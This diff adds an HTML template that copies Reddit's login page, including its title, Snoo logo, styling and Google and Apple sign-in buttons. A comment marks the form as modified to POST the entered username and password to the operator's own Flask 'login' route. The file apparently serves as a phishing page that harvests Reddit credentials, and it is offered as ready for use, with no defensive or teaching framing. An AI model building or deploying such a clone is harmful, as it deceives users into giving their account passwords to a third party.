@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Reddit</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #0f1a1c;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px 16px;
+        }
+
+        .main-card {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+        }
+
+        /* Official Reddit Snoo Logo */
+        .reddit-logo {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 16px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #0f1a1c;
+            margin-bottom: 8px;
+            letter-spacing: -0.3px;
+        }
+
+        .terms-text {
+            font-size: 12px;
+            color: #576f76;
+            line-height: 16px;
+            margin-bottom: 24px;
+        }
+
+        .terms-text a {
+            color: #0045ac;
+            text-decoration: none;
+        }
+
+        /* Social SSO Buttons */
+        .social-buttons {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .btn-social {
+            width: 100%;
+            height: 48px;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            cursor: pointer;
+            background-color: #f2f4f5;
+            color: #0f1a1c;
+            border: none;
+            transition: background-color 0.2s;
+        }
+
+        .btn-social:hover {
+            background-color: #e4e8ea;
+        }
+
+        .social-svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            margin: 8px 0 16px 0;
+            color: #82959b;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #eaedef;
+        }
+
+        .divider span {
+            padding: 0 12px;
+            text-transform: uppercase;
+        }
+
+        /* Form */
+        .login-form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .input-group {
+            position: relative;
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 48px;
+            padding: 0 16px;
+            background-color: #f2f4f5;
+            border: 1px solid transparent;
+            border-radius: 24px;
+            font-size: 14px;
+            outline: none;
+            color: #0f1a1c;
+        }
+
+        .input-field:focus {
+            border-color: #0045ac;
+            background-color: #ffffff;
+        }
+
+        .input-field::placeholder {
+            color: #576f76;
+        }
+
+        .forgot-link {
+            font-size: 12px;
+            font-weight: 600;
+            color: #0045ac;
+            text-decoration: none;
+            margin-left: 12px;
+            margin-top: 2px;
+            margin-bottom: 4px;
+        }
+
+        .btn-submit {
+            width: 100%;
+            height: 48px;
+            background-color: #ff4500;
+            border: none;
+            border-radius: 24px;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit:hover {
+            background-color: #e03d00;
+        }
+
+        .footer-text {
+            margin-top: 24px;
+            font-size: 13px;
+            color: #0f1a1c;
+        }
+
+        .footer-text a {
+            color: #0045ac;
+            font-weight: 600;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <main class="main-card">
+        <svg class="reddit-logo" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="10" cy="10" r="10" fill="#FF4500"/>
+            <path fill="#FFF" d="M16.67 10a1.46 1.46 0 0 0-2.47-1 7.12 7.12 0 0 0-3.85-1.23l.65-3.08 2.13.45a1 1 0 1 0 1.07-1 1 1 0 0 0-.96.72l-2.38-.5a.16.16 0 0 0-.19.12l-.76 3.61a7.17 7.17 0 0 0-3.92 1.23 1.46 1.46 0 1 0-1.87 2.37 3.09 3.09 0 0 0 0 .43c0 2.21 2.59 4 5.78 4s5.78-1.79 5.78-4a3 3 0 0 0 0-.43 1.44 1.44 0 0 0 .99-1.7zm-9.3 0a1 1 0 1 1 1 1 1 1 0 0 1-1-1zm6 3.08a3.57 3.57 0 0 1-2.37.74 3.57 3.57 0 0 1-2.37-.74.22.22 0 0 1 .31-.3 3.12 3.12 0 0 0 2.06.6 3.12 3.12 0 0 0 2.06-.6.22.22 0 0 1 .31.3zm-.33-2.08a1 1 0 1 1 1-1 1 1 0 0 1-1 1z"/>
+        </svg>
+
+        <h1 class="title">Log in</h1>
+        <p class="terms-text">
+            By continuing, you agree to our <a href="#">User Agreement</a> and acknowledge that you understand the <a href="#">Privacy Policy</a>.
+        </p>
+
+        <div class="social-buttons">
+            <button class="btn-social">
+                <svg class="social-svg" viewBox="0 0 24 24">
+                    <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.14h6.6c-.28 1.52-1.13 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.665-5.17 3.665-8.8z"/>
+                    <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.26v3.15C3.25 21.3 7.31 24 12 24z"/>
+                    <path fill="#FBBC05" d="M5.28 14.27c-.25-.72-.38-1.49-.38-2.27s.13-1.55.38-2.27V6.58H1.26C.46 8.17 0 9.99 0 12s.46 3.83 1.26 5.42l4.02-3.15z"/>
+                    <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.31 0 3.25 2.7 1.26 6.58l4.02 3.15c.95-2.83 3.6-4.98 6.72-4.98z"/>
+                </svg>
+                Continue with Google
+            </button>
+
+            <button class="btn-social">
+                <svg class="social-svg" viewBox="0 0 24 24" fill="#000000">
+                    <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 6.1c.63-.77 1.06-1.84.94-2.92-.92.04-2.05.62-2.71 1.39-.59.68-1.11 1.78-.97 2.84 1.03.08 2.1-.54 2.74-1.31z"/>
+                </svg>
+                Continue with Apple
+            </button>
+        </div>
+
+        <div class="divider">
+            <span>or</span>
+        </div>
+
+        <!-- MODIFIED FORM: action points to Flask route, POST method, inputs have names -->
+        <form class="login-form" action="{{ url_for('login') }}" method="POST">
+            <div class="input-group">
+                <input type="text" class="input-field" name="username" placeholder="Email or username" required />
+            </div>
+
+            <div class="input-group">
+                <input type="password" class="input-field" name="password" placeholder="Password" required />
+            </div>
+
+            <a href="#" class="forgot-link">Forgot password?</a>
+
+            <button type="submit" class="btn-submit">Log In</button>
+        </form>
+
+        <div class="footer-text">
+            New to Reddit? <a href="#">Sign Up</a>
+        </div>
+    </main>
+
+</body>
+</html>
